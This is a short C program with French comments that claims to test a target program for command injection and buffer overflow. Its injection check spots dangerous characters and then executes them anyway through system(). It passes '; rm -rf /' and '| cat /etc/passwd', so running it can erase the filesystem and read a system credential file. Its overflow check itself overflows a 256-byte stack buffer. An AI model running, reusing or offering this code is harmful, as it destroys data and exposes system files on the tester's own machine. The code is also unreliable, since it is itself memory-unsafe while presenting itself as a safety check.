#include <stdio.h>
#include <string.h>

// Vérifie si le programme cible est vulnérable à l'injection de commandes
int check_command_injection(char* target, char* input) {
  // Exécutez le programme cible en lui passant l'entrée comme argument
  char command[256];
  sprintf(command, "%s %s", target, input);

  // Vérifiez si l'entrée contient des caractères dangereux
  if (strchr(input, ';') != NULL || strchr(input, '|') != NULL) {
    printf("Dangerous input detected !\n");
    system(command);
    return 1;
  }

  return 0;
}

// Vérifie si le programme cible est vulnérable à la surcharge de tampon
int check_buffer_overflow(char* target, char* input) {
  // Ajoutez des caractères supplémentaires à l'entrée jusqu'à ce qu'elle dépasse la taille maximale du tampon
  char buffer[256];
  strcpy(buffer, input);
  while (strlen(buffer) < 300) {
    strcat(buffer, "A");
  }

  // Exécutez le programme cible en lui passant l'entrée surchargée en tant qu'argument
  char command[256];
  sprintf(command, "%s %s", target, buffer);
  system(command);

  return 0;
}

int main(int argc, char** argv) {
  // Vérifiez si le programme a été exécuté avec des arguments
  if (argc < 2) {
    printf("Usage : %s [target program]\n", argv[0]);
    return 1;
  }

  // Récupérez le nom du programme cible
  char* target = argv[1];

  // Exécutez les tests de vulnérabilité sur le programme cible
  printf("Testing command injection vulnerability...\n");
  check_command_injection(target, "; rm -rf /");
  check_command_injection(target, "| cat /etc/passwd");

  printf("\nTesting buffer overflow vulnerability...\n");
  check_buffer_overflow(target, "AAAAAA");

  return 0;
}
